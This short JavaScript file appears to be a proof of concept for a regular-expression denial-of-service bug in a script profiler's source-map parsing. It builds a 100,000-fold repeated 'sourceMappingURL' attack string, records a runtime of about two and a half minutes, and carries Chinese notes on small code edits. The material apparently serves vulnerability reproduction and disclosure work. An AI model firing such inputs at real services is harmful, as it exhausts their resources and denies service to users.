import { Script } from "./profile.mjs";

//Attack String :""+"//# sourceMappingURL="*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "//# sourceMappingURL=";
}
str += "\u0000";

const script = new Script();
script.update("a", str);
const result = script.ensureSourceMapCalculated();

// real    2m30.964s
// user    2m30.785s
// sys     0m0.060s

//将?.改为了. 将??改为了||
//注释了2个import